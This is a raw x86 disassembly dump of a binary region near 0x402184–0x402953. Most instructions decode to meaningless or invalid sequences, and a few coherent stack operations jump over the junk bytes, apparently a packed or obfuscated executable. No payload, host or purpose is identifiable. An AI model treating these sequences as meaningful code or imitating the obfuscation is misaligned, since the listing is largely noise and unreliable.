  402184:	jl     0x40212d
  402186:	add    ch,BYTE PTR [ecx+0x6c028020]
  40218c:	loopne 0x402147
  40218e:	js     0x4021a0
  402190:	mov    esi,0x5f20eb16
  402195:	cwde   
  402196:	mov    eax,ds:0xbcf09a11
  40219b:	outs   dx,DWORD PTR ds:[esi]
  40219c:	or     eax,0x82fcffcb
  4021a1:	xor    cl,BYTE PTR [esi+ecx*4]
  4021a4:	test   al,0xb3
  4021a6:	push   cs
  4021a7:	mov    esp,0xce1306b8
  4021ac:	add    dh,BYTE PTR [eax]
  4021ae:	test   DWORD PTR [ebp+0x72],0x794f807b
  4021b5:	add    bh,BYTE PTR [edx-0x46449f3e]
  4021bb:	jge    0x402197
  4021bd:	daa    
  4021be:	push   edi
  4021bf:	or     BYTE PTR [edx],0xb4
  4021c2:	outs   dx,DWORD PTR ds:[esi]
  4021c3:	inc    edx
  4021c4:	fcomp  QWORD PTR [edi+0x5bae76ce]
  4021ca:	outs   dx,BYTE PTR ds:[esi]
  4021cb:	imul   ecx,DWORD PTR [edi+ebx*2-0x6efb07b8],0xc25346bc
  4021d6:	ins    BYTE PTR es:[edi],dx
  4021d7:	das    
  4021d8:	ss or  eax,0x6969e733
  4021de:	ds xchg ah,bl
  4021e1:	and    dh,BYTE PTR [edx+0x78]
  4021e4:	pop    ecx
  4021e5:	pushf  
  4021e6:	shr    ebp,cl
  4021e8:	xlat   BYTE PTR ds:[ebx]
  4021e9:	inc    esp
  4021ea:	rol    BYTE PTR [ebx],0x84
  4021ed:	mov    dh,0x2d
  4021ef:	fldcw  WORD PTR [edi-0x4cdc3df]
  4021f5:	mov    ah,0xa3
  4021f7:	push   ecx
  4021f8:	adc    BYTE PTR [edi],al
  4021fa:	push   ds
  4021fb:	retf   0xe29c
  4021fe:	addr16 imul ebp,esi,0x34
  402202:	lods   al,BYTE PTR ds:[esi]
  402203:	js     0x4021b5
  402205:	push   ecx
  402206:	into   
  402207:	into   
  402208:	arpl   WORD PTR [esi-0x51c278c3],cx
  40220e:	loopne 0x4021d6
  402210:	stc    
  402211:	sahf   
  402212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402213:	or     esp,DWORD PTR [esi]
  402215:	pop    ds
  402216:	mov    ?,WORD PTR [esi+ebx*2]
  402219:	mul    DWORD PTR [edx]
  40221b:	push   ss
  40221c:	mov    al,0x9a
  40221e:	(bad)  
  40221f:	out    0xb7,eax
  402221:	jmp    0x7899:0xf6918c30
  402228:	out    0xaf,eax
  40222a:	dec    eax
  40222b:	adc    BYTE PTR [edx-0x57],bh
  40222e:	mov    eax,0x6782d1c6
  402233:	out    dx,eax
  402234:	(bad)  
  402236:	icebp  
  402237:	cmp    al,0xb9
  402239:	out    dx,al
  40223a:	and    ebp,DWORD PTR [edx+ecx*1-0x10457848]
  402241:	sti    
  402242:	push   cs
  402243:	pop    ds
  402244:	das    
  402245:	and    eax,0x45642324
  40224a:	inc    esp
  40224b:	es inc ecx
  40224d:	out    0x6c,al
  40224f:	je     0x4021e4
  402251:	icebp  
  402252:	mov    esi,0x40e658af
  402257:	dec    edx
  402258:	fmul   st(2),st
  40225a:	cwde   
  40225b:	xor    DWORD PTR [edi+0x4ed6bd6e],esp
  402261:	pop    ebp
  402262:	pop    edx
  402263:	or     ecx,DWORD PTR [edx]
  402265:	sbb    ebx,DWORD PTR [esi]
  402267:	mov    ch,BYTE PTR [ebp+0x61]
  40226a:	pop    ebp
  40226b:	jle    0x402275
  40226d:	inc    ecx
  40226e:	sub    DWORD PTR [edi-0x2ae35d84],ecx
  402274:	ss out 0x36,al
  402277:	sub    eax,0xfda110fe
  40227c:	ret    0xcf9c
  40227f:	call   0x92d496a2
  402284:	adc    BYTE PTR [eax+0xd],ah
  402287:	xchg   ecx,eax
  402288:	jle    0x402247
  40228a:	xor    BYTE PTR [edi],bl
  40228c:	(bad)  
  40228d:	jnp    0x4022a0
  40228f:	inc    ebp
  402290:	aam    0x29
  402292:	jmp    0x4022f5
  402294:	inc    esp
  402295:	add    al,ah
  402297:	arpl   cx,si
  402299:	shl    DWORD PTR [ebx],cl
  40229b:	mov    DWORD PTR [edx+0x4f707db7],edi
  4022a1:	pop    ss
  4022a2:	xor    eax,0xf62f1ef
  4022a7:	shl    DWORD PTR ds:0x80825e5c,0x1b
  4022ae:	aas    
  4022af:	imul   edi,DWORD PTR [ecx+ebp*4+0x5f74945],0x3d
  4022b7:	stos   BYTE PTR es:[edi],al
  4022b8:	ss pop ebx
  4022ba:	xchg   edi,eax
  4022bb:	pop    ds
  4022bc:	sub    al,dl
  4022be:	aaa    
  4022bf:	jmp    0xed2d:0xbf0b09b2
  4022c6:	sbb    DWORD PTR [ecx-0x74],esi
  4022c9:	stos   BYTE PTR es:[edi],al
  4022ca:	dec    ebx
  4022cb:	gs xchg ebp,eax
  4022cd:	lock in al,dx
  4022cf:	xor    ch,BYTE PTR [eax+0xbdf1296]
  4022d5:	cmp    cl,dl
  4022d7:	(bad)  
  4022d8:	out    0xdc,al
  4022da:	shl    BYTE PTR [ebx],0xd3
  4022dd:	shl    BYTE PTR [ebx+0x3720ad3f],0xf3
  4022e4:	mov    bl,0x3a
  4022e6:	retf   
  4022e7:	mov    ?,WORD PTR [ebx]
  4022e9:	push   esi
  4022ea:	cmc    
  4022eb:	out    0x9f,al
  4022ed:	xchg   esp,eax
  4022ee:	scas   al,BYTE PTR es:[edi]
  4022ef:	pop    ecx
  4022f0:	stos   DWORD PTR es:[edi],eax
  4022f1:	xor    BYTE PTR [ebp+0x45],dh
  4022f4:	fld    TBYTE PTR [ebx+0x5053ab6e]
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	lods   eax,DWORD PTR ds:[esi]
  402358:	push   ebp
  402359:	mov    eax,0x7e039a12
  40235e:	jle    0x40235a
  402360:	jg     0x4023e0
  402362:	jle    0x402391
  402364:	pop    ecx
  402365:	call   0x6419198d
  40236a:	sbb    al,0x19
  40236c:	xchg   edx,eax
  40236d:	pop    ds
  40236e:	dec    edx
  40236f:	aas    
  402370:	fs push ds
  402372:	nop
  402373:	pop    ebp
  402374:	lahf   
  402375:	xor    edi,DWORD PTR [ecx-0x765909b2]
  40237b:	cs je  0xa85afd70
  402382:	in     al,0xdd
  402384:	pop    edx
  402385:	add    DWORD PTR [ebx-0x53],esi
  402388:	ficomp WORD PTR [edi]
  40238a:	adc    ebx,ebx
  40238c:	mov    edx,0xffb4290c
  402391:	inc    esp
  402392:	arpl   sp,bp
  402394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402395:	ret    
  402396:	pop    ebp
  402397:	shl    DWORD PTR [esp+esi*4],0x68
  40239b:	jl     0x402357
  40239d:	retf   
  40239e:	jge    0x402342
  4023a0:	dec    BYTE PTR [ecx+0x52]
  4023a3:	stos   BYTE PTR es:[edi],al
  4023a4:	nop
  4023a5:	xor    al,0x97
  4023a7:	scas   eax,DWORD PTR es:[edi]
  4023a8:	xchg   esp,eax
  4023a9:	jne    0x4023b8
  4023ab:	adc    al,BYTE PTR [edx]
  4023ad:	push   ss
  4023ae:	inc    esi
  4023af:	ret    
  4023b0:	inc    edx
  4023b1:	jae    0x4023e1
  4023b3:	and    dh,BYTE PTR [edi-0xc]
  4023b6:	int3   
  4023b7:	inc    ebx
  4023b8:	pop    eax
  4023b9:	cmp    cl,BYTE PTR [esi]
  4023bb:	nop
  4023bc:	lods   eax,DWORD PTR ds:[esi]
  4023bd:	ins    BYTE PTR es:[edi],dx
  4023be:	mov    ch,0xf2
  4023c0:	enter  0xc168,0x14
  4023c4:	repnz (bad) 
  4023c6:	clc    
  4023c7:	pusha  
  4023c8:	(bad)  
  4023c9:	sbb    eax,0x63c18ee1
  4023ce:	mov    ah,0xa6
  4023d0:	icebp  
  4023d1:	mov    ds:0xade130d5,eax
  4023d6:	pusha  
  4023d7:	push   ecx
  4023d8:	cwde   
  4023d9:	fcmovb st,st(1)
  4023db:	pushf  
  4023dc:	mov    al,0x1d
  4023de:	stos   DWORD PTR es:[edi],eax
  4023df:	lds    eax,FWORD PTR [esi+0x2c]
  4023e2:	(bad)  
  4023e3:	int3   
  4023e4:	pop    ebx
  4023e5:	inc    ecx
  4023e6:	jmp    0x94b719b7
  4023eb:	mov    WORD PTR [eax-0x776d5bbd],?
  4023f1:	pushf  
  4023f2:	loopne 0x40243d
  4023f4:	sbb    BYTE PTR [ebp+0x34],bl
  4023f7:	pop    eax
  4023f8:	jmp    0xa243:0x10a466b1
  4023ff:	fbld   TBYTE PTR [edi]
  402401:	add    DWORD PTR [edx-0x48848a9e],edi
  402407:	fnstenv [eax-0x43fa8ce5]
  40240d:	mov    ch,0x42
  40240f:	ret    
  402410:	push   ebx
  402411:	scas   al,BYTE PTR es:[edi]
  402412:	fdiv   st,st(7)
  402414:	sub    eax,0x90a2d5bf
  402419:	mov    eax,ds:0xf83b91f2
  40241e:	(bad)  
  40241f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402420:	jmp    0x391badb
  402425:	stos   DWORD PTR es:[edi],eax
  402426:	jp     0x402432
  402428:	xchg   edi,eax
  402429:	push   eax
  40242a:	xchg   edi,eax
  40242b:	iret   
  40242c:	add    ch,cl
  40242e:	inc    ebp
  40242f:	(bad)  
  402430:	shl    bh,cl
  402432:	mov    ch,BYTE PTR [ecx]
  402434:	call   0x5d0ae495
  402439:	scas   eax,DWORD PTR es:[edi]
  40243a:	cdq    
  40243b:	pushf  
  40243c:	xor    eax,0xcf6ddb76
  402441:	jmp    0x3c0f:0xb40839b9
  402448:	arpl   ax,di
  40244a:	cmp    esp,DWORD PTR [ebx-0x21020a58]
  402450:	push   ebx
  402451:	jns    0x4024be
  402453:	jae    0x40249a
  402455:	loope  0x4024ce
  402457:	mov    eax,0x22480ddf
  40245c:	xor    al,0xd6
  40245e:	test   al,0xa6
  402460:	jo     0x4024ab
  402462:	xchg   BYTE PTR [esi+0x7f],bl
  402465:	inc    eax
  402466:	data16 repz sbb BYTE PTR [eax-0x63],ah
  40246b:	(bad)  
  40246c:	ins    DWORD PTR es:[edi],dx
  40246d:	and    dl,BYTE PTR [edi*4+0xc77c1e3]
  402474:	push   es
  402475:	leave  
  402476:	data16 jle 0x40247d
  402479:	shr    BYTE PTR [esi+eax*1+0x72956968],1
  402480:	mov    ebp,0x4945491a
  402485:	(bad)  
  402486:	shr    bh,0x2b
  402489:	push   ebp
  40248a:	mov    ecx,0x8d78595f
  40248f:	and    ecx,0xffffff94
  402492:	call   0x818e8c4f
  402497:	(bad)  [edx-0x9fca87d]
  40249d:	xchg   ebx,eax
  40249e:	gs test al,0x44
  4024a1:	or     DWORD PTR [ebp+0x57],eax
  4024a4:	add    al,dh
  4024a6:	mov    al,0x82
  4024a8:	in     eax,dx
  4024a9:	in     eax,dx
  4024aa:	mov    ebp,0x81a46cbb
  4024af:	fsubr  st(6),st
  4024b1:	leave  
  4024b2:	jbe    0x402453
  4024b4:	test   DWORD PTR [esi],0xc9cd953f
  4024ba:	fcomp  DWORD PTR cs:[ecx]
  4024bd:	das    
  4024be:	shl    BYTE PTR ds:0xbc26135,1
  4024c4:	xchg   esp,eax
  4024c5:	fldln2 
  4024c7:	lods   eax,DWORD PTR ds:[esi]
  4024c8:	and    eax,0xe612c8cb
  4024cd:	mov    ecx,0x9fa7ad92
  4024d2:	loop   0x4024ba
  4024d4:	popa   
  4024d5:	arpl   WORD PTR [eax-0x126e79e0],di
  4024db:	push   esi
  4024dc:	pop    ebp
  4024dd:	inc    eax
  4024de:	add    cl,BYTE PTR [eax+0x64]
  4024e1:	inc    esi
  4024e2:	add    eax,0x10ceb74a
  4024e7:	mov    eax,DWORD PTR [ebp-0x10]
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	push   cs
  40250e:	pop    es
  40250f:	xchg   ebp,eax
  402510:	test   eax,0x7e7e0126
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x4024ad
  40251a:	rcr    BYTE PTR ds:0x75440dee,1
  402520:	and    al,0xd6
  402522:	test   eax,0x2336910a
  402527:	mov    esi,0xc52c5a9d
  40252c:	pop    esi
  40252d:	cmp    DWORD PTR [edx+edx*1],esp
  402530:	enter  0x318d,0x5
  402534:	int    0x54
  402536:	dec    ecx
  402537:	int    0x47
  402539:	push   esp
  40253a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40253b:	and    dl,BYTE PTR [ebx-0x603f298e]
  402541:	mov    esp,0x2f647f67
  402546:	mov    dl,BYTE PTR [ecx-0x67f58c33]
  40254c:	gs lahf 
  40254e:	call   0x77cb7cd8
  402553:	arpl   WORD PTR [edx+0xb],sp
  402556:	jl     0x402525
  402558:	sbb    eax,DWORD PTR ds:0x9e05b451
  40255e:	add    al,BYTE PTR [edi-0x49]
  402561:	adc    DWORD PTR [edx+ebp*1+0x2cee1c62],0xffffffee
  402569:	mov    ds:0xf89404de,eax
  40256e:	std    
  40256f:	add    DWORD PTR [ebp-0x6b],edx
  402572:	das    
  402573:	ds jecxz 0x4024ff
  402576:	xchg   DWORD PTR [eax],ebp
  402578:	cmp    al,0x91
  40257a:	push   edi
  40257b:	mov    eax,0x5b4979fa
  402580:	jl     0x40258c
  402582:	jno    0x402512
  402584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402585:	lods   al,BYTE PTR ds:[esi]
  402586:	push   esp
  402587:	xchg   esi,eax
  402588:	push   eax
  402589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40258a:	xor    al,0x62
  40258c:	mov    ch,0xaa
  40258e:	cld    
  40258f:	xchg   edx,eax
  402590:	inc    ebx
  402591:	xchg   esi,eax
  402592:	cmp    ecx,0x8270577b
  402598:	or     eax,0xd9bcae1c
  40259d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40259e:	out    dx,al
  40259f:	xor    al,0x97
  4025a1:	or     DWORD PTR ds:0x6a1a90e,esp
  4025a7:	jmp    0x8bc7dcde
  4025ac:	bt     DWORD PTR ds:0x1357d90e,eax
  4025b3:	or     DWORD PTR [eax-0x73],esi
  4025b6:	sahf   
  4025b7:	outs   dx,DWORD PTR ds:[esi]
  4025b8:	adc    al,0xeb
  4025ba:	daa    
  4025bb:	rcr    BYTE PTR [ebp-0x6b],0x1f
  4025bf:	dec    ebx
  4025c0:	sub    BYTE PTR [edx-0x83b9807],0x98
  4025c7:	mov    ah,0xc
  4025c9:	cld    
  4025ca:	adc    al,0x27
  4025cc:	push   ecx
  4025cd:	cmp    BYTE PTR [esi-0x3eea2a5b],dl
  4025d3:	call   0x742b:0x27fe996
  4025da:	jp     0x40260e
  4025dc:	imul   DWORD PTR [esi+0x51]
  4025df:	ja     0x40258e
  4025e1:	add    eax,ecx
  4025e3:	bound  ebx,QWORD PTR [ebx-0x7d]
  4025e6:	daa    
  4025e7:	mov    dh,0xff
  4025e9:	test   ecx,edi
  4025eb:	or     al,0x66
  4025ed:	xchg   BYTE PTR [ebp+0x1a],al
  4025f0:	sbb    eax,0x9b90ba20
  4025f5:	or     DWORD PTR [eax-0x1c8e08b5],edi
  4025fb:	jl     0x402619
  4025fd:	mov    DWORD PTR [edi],esp
  4025ff:	gs xor dl,0xf7
  402603:	clc    
  402604:	cmovo  esp,DWORD PTR [eax]
  402607:	pop    ebp
  402608:	mov    esp,eax
  40260a:	fdiv   QWORD PTR [ecx-0x70]
  40260d:	test   DWORD PTR ds:[esi],edi
  402610:	jge    0x4025b7
  402612:	cmc    
  402613:	inc    ebp
  402614:	jne    0x40260e
  402616:	test   eax,0xc3f2945f
  40261b:	shr    BYTE PTR [eax],cl
  40261d:	push   edx
  40261e:	(bad)  
  40261f:	adc    eax,0x227b5ae7
  402624:	les    ebp,FWORD PTR [ecx+0x36]
  402627:	jmp    0x5d72:0x72a911ca
  40262e:	sahf   
  40262f:	pop    edx
  402630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402631:	jo     0x402644
  402633:	jmp    0x4025b7
  402635:	jl     0x40260b
  402637:	sub    DWORD PTR [esi+0x64],ebp
  40263a:	sbb    ebx,0x3b521a7a
  402640:	jb     0x4025e5
  402642:	repnz dec ecx
  402644:	push   edx
  402645:	mov    edi,0x84ef5f0a
  40264a:	in     eax,0x99
  40264c:	xchg   esp,eax
  40264d:	xor    al,BYTE PTR [ecx+eax*2+0x69783266]
  402654:	pop    edi
  402655:	pop    ebp
  402656:	adc    BYTE PTR [edi+0x40],al
  402659:	jns    0x402602
  40265b:	scas   al,BYTE PTR es:[edi]
  40265c:	fsub   QWORD PTR [edi+esi*1-0x6448753]
  402663:	aad    0x90
  402665:	cs in  eax,0xc7
  402668:	aad    0x3c
  40266a:	mov    edx,0x21d3951b
  40266f:	hlt    
  402670:	add    bl,ah
  402672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402673:	pop    ebx
  402674:	push   ss
  402675:	sbb    DWORD PTR [ebx+0x79dce14d],eax
  40267b:	shr    BYTE PTR [edi+ebx*1-0x39f92f88],cl
  402682:	cwde   
  402683:	outs   dx,DWORD PTR ds:[esi]
  402684:	add    BYTE PTR [ebx],ah
  402686:	inc    esi
  402687:	daa    
  402688:	cs sub eax,0xa543961b
  40268e:	aam    0xd9
  402690:	loop   0x402626
  402692:	xlat   BYTE PTR ds:[ebx]
  402693:	xchg   edi,eax
  402694:	push   edi
  402695:	pop    ebp
  402696:	cmp    cl,al
  402698:	sbb    BYTE PTR [eax+0x3320d0c0],ah
  40269e:	mov    BYTE PTR ds:0x32729b,0x89
  4026a5:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  4026ab:	clc    
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	(bad)
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x40269a
  4026df:	(bad)  
  4026e0:	pushf  
  4026e1:	ins    BYTE PTR es:[edi],dx
  4026e2:	pop    ebx
  4026e3:	xor    eax,0xad757b85
  4026e8:	sbb    ebp,edx
  4026ea:	adc    ebx,DWORD PTR [edi-0x5b]
  4026ed:	xchg   ebx,eax
  4026ee:	clc    
  4026ef:	pop    edi
  4026f0:	xor    al,ah
  4026f2:	dec    eax
  4026f3:	js     0x40268d
  4026f5:	jmp    0xfe1f970
  4026fa:	mov    ch,0x1a
  4026fc:	push   ebp
  4026fd:	inc    eax
  4026fe:	fld    TBYTE PTR [ebx-0x2e15d3dc]
  402704:	test   dl,bl
  402706:	xchg   esi,eax
  402707:	jge    0x402772
  402709:	dec    esp
  40270a:	fs int 0x4f
  40270d:	call   0x30ba50c3
  402712:	call   0x4e36:0x25c4f6d8
  402719:	cmp    bl,BYTE PTR [edx-0x60]
  40271c:	stos   BYTE PTR es:[edi],al
  40271d:	xlat   BYTE PTR ds:[ebx]
  40271e:	cli    
  40271f:	xchg   ah,bl
  402721:	aam    0x33
  402723:	ror    ch,cl
  402725:	loop   0x4026b2
  402727:	jmp    0x402715
  402729:	aas    
  40272a:	nop
  40272b:	mov    edx,0xb9d2f02b
  402730:	push   eax
  402731:	push   es
  402732:	cdq    
  402733:	jnp    0x4026c5
  402735:	xchg   ecx,eax
  402736:	in     eax,0x7d
  402738:	retf   
  402739:	pushf  
  40273a:	ins    DWORD PTR es:[edi],dx
  40273b:	dec    edx
  40273c:	out    dx,al
  40273d:	retf   0xd519
  402740:	fs ret 0x250a
  402744:	mov    dl,ch
  402746:	daa    
  402747:	aam    0xeb
  402749:	xor    ebp,DWORD PTR [ebx+0x5cb65242]
  40274f:	lods   al,BYTE PTR ds:[esi]
  402750:	out    0x9b,al
  402752:	imul   eax,edx,0x36
  402755:	xor    BYTE PTR [ecx+0x71],dh
  402758:	adc    al,0xbb
  40275a:	sub    ch,ah
  40275c:	adc    eax,0xe560207d
  402761:	jmp    0xefb7:0x9d6a3e6b
  402768:	in     eax,dx
  402769:	and    ah,BYTE PTR [edx]
  40276b:	xlat   BYTE PTR ds:[ebx]
  40276c:	fs stos BYTE PTR es:[edi],al
  40276e:	iret   
  40276f:	jmp    0x2584:0x9f9c81f0
  402776:	sbb    eax,eax
  402778:	mov    ebx,0xc1f8a558
  40277d:	push   DWORD PTR [esi-0x7aa2e2f4]
  402783:	or     bh,BYTE PTR [ebp-0xa129b6a]
  402789:	inc    esp
  40278a:	into   
  40278b:	cmc    
  40278c:	int3   
  40278d:	jns    0x40278f
  40278f:	shr    BYTE PTR [edx+0x65],0xca
  402793:	retf   
  402794:	ror    DWORD PTR [esi-0x44],cl
  402797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402798:	mov    al,0x17
  40279a:	in     al,0x76
  40279c:	leave  
  40279d:	outs   dx,BYTE PTR ds:[esi]
  40279e:	add    edi,DWORD PTR [esi]
  4027a0:	and    al,0x8c
  4027a2:	neg    BYTE PTR [eax+0x3032e84b]
  4027a8:	jge    0x402781
  4027aa:	rcr    BYTE PTR [edx],1
  4027ac:	push   0x3b
  4027ae:	in     al,dx
  4027af:	aas    
  4027b0:	sub    al,0xd3
  4027b2:	pop    esi
  4027b3:	sbb    ecx,DWORD PTR [esi+0x7]
  4027b6:	pop    edi
  4027b7:	mov    ebx,0xb3ec7f7
  4027bc:	inc    edi
  4027bd:	adc    DWORD PTR [edx+0x495f586a],esp
  4027c3:	inc    ebp
  4027c4:	stc    
  4027c5:	rcl    BYTE PTR [edx+0xee2b468],1
  4027cb:	mov    ebx,0xb0dc8494
  4027d0:	fs out 0x7f,eax
  4027d3:	xchg   ecx,eax
  4027d4:	rol    DWORD PTR [di+0x23f2],0x4b
  4027da:	inc    esi
  4027db:	jle    0x40284e
  4027dd:	xchg   DWORD PTR [edx+0x3e],ecx
  4027e0:	adc    BYTE PTR [ebx+0x44],bh
  4027e3:	sbb    eax,0x1688204c
  4027e8:	adc    al,0x60
  4027ea:	push   es
  4027eb:	retf   
  4027ec:	cdq    
  4027ed:	or     eax,0x1d63b0d4
  4027f2:	sub    ah,BYTE PTR [eax]
  4027f4:	rcr    BYTE PTR ds:0xe824b1,1
  4027fa:	sub    eax,0xe2ba8d48
  4027ff:	test   al,0x36
  402801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402802:	mov    BYTE PTR [esi+eiz*4-0x6a],dh
  402806:	inc    esi
  402807:	jecxz  0x402873
  402809:	sub    dl,BYTE PTR [edi]
  40280b:	out    0xc,al
  40280d:	cmp    bh,BYTE PTR [ebx-0x2a]
  402810:	sub    edi,ebx
  402812:	data16 add al,0xd6
  402815:	xor    DWORD PTR [edi+0x48],ebx
  402818:	dec    ebp
  402819:	lahf   
  40281a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40281b:	fucomi st,st(4)
  40281d:	mov    edi,0x8d2804fd
  402822:	jnp    0x402832
  402824:	int    0xd6
  402826:	(bad)  
  402827:	lods   eax,DWORD PTR ds:[esi]
  402828:	mov    eax,ss
  40282a:	and    ah,BYTE PTR [ebx+0x24aef1e3]
  402830:	adc    dh,BYTE PTR [edx-0x5d5b7d7]
  402836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402837:	rcr    edx,cl
  402839:	xor    esi,edx
  40283b:	popf   
  40283c:	enter  0x65ef,0x57
  402840:	pop    ss
  402841:	neg    DWORD PTR [ecx-0x39]
  402844:	loope  0x402868
  402846:	sbb    eax,0x22b23c71
  40284b:	and    eax,0xccb6203e
  402850:	hlt    
  402851:	jnp    0x40284c
  402853:	call   0xe42b:0xf0ba7222
  40285a:	in     eax,0x7e
  40285c:	jecxz  0x40289e
  40285e:	rcl    DWORD PTR [ecx-0x3],0x6a
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	js     0x4028cd
  402885:	jl     0x40280e
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402902
  402890:	jo     0x4028ca
  402892:	dec    ebx
  402893:	push   0x860b16ef
  402898:	add    dl,BYTE PTR [edi-0x24]
  40289b:	ins    DWORD PTR es:[edi],dx
  40289c:	outs   dx,DWORD PTR ds:[esi]
  40289d:	jne    0x402861
  40289f:	sbb    al,0xdf
  4028a1:	inc    ebx
  4028a2:	sub    dh,BYTE PTR [ebp+0x4]
  4028a5:	out    dx,al
  4028a6:	inc    ebx
  4028a7:	mov    al,0xf0
  4028a9:	aas    
  4028aa:	mov    ah,0xbc
  4028ac:	out    dx,eax
  4028ad:	inc    eax
  4028ae:	rcr    DWORD PTR [ecx+ebx*4+0x1640d08a],0x28
  4028b6:	add    esi,ecx
  4028b8:	rcl    BYTE PTR cs:[ebx],1
  4028bb:	(bad)  
  4028bc:	xchg   ebx,eax
  4028bd:	int3   
  4028be:	push   ebp
  4028bf:	adc    BYTE PTR [ebp-0x4423c9a4],0x14
  4028c6:	das    
  4028c7:	icebp  
  4028c8:	ins    BYTE PTR es:[edi],dx
  4028c9:	lods   al,BYTE PTR fs:[esi]
  4028cb:	or     eax,0x40a1c065
  4028d0:	xchg   esi,eax
  4028d1:	fs xchg edi,eax
  4028d3:	and    eax,0xaafbad4f
  4028d8:	lds    esi,FWORD PTR [edi+0x7a]
  4028db:	ret    0xd123
  4028de:	gs je  0x402943
  4028e1:	lods   eax,DWORD PTR ds:[esi]
  4028e2:	dec    edx
  4028e3:	div    bl
  4028e5:	dec    esi
  4028e6:	test   eax,0xe467a2e1
  4028eb:	ja     0x4028c2
  4028ed:	add    dl,BYTE PTR [edi-0x11afcd88]
  4028f3:	addr16 sbb eax,0x4c87e2ae
  4028f9:	mov    bl,cl
  4028fb:	fadd   DWORD PTR [ecx+0x3ff858d7]
  402901:	lock cdq 
  402903:	mov    dh,0x2
  402905:	loope  0x4028f7
  402907:	in     al,0x33
  402909:	daa    
  40290a:	fstp   TBYTE PTR [ecx]
  40290c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40290d:	sub    eax,0x7be4e034
  402912:	xchg   esi,eax
  402913:	stc    
  402914:	add    cl,0xaf
  402917:	test   dh,ah
  402919:	mov    DWORD PTR [ebp+0x21afa6c9],ebp
  40291f:	aad    0xfc
  402921:	mov    cl,0x97
  402923:	int    0x1
  402925:	cmp    esi,eax
  402927:	arpl   WORD PTR [eax],si
  402929:	mov    eax,0xb49caf31
  40292e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40292f:	adc    BYTE PTR [ebx],0x2f
  402932:	retf   0x5545
  402935:	std    
  402936:	daa    
  402937:	icebp  
  402938:	mov    bl,bh
  40293a:	js     0x4029a4
  40293c:	push   edx
  40293d:	mov    ah,0x52
  40293f:	dec    ebp
  402940:	(bad)  
  402941:	dec    esp
  402942:	fs fucomp st(0)
  402945:	repnz mov bh,0x54
  402948:	sbb    edx,edi
  40294a:	neg    BYTE PTR [ecx]
  40294c:	mov    ?,WORD PTR [esi]
  40294e:	bound  edi,QWORD PTR [esi]
  402950:	lods   eax,DWORD PTR ds:[esi]
  402951:	mov    bl,0x1b
  402953:	ret    0x7ca
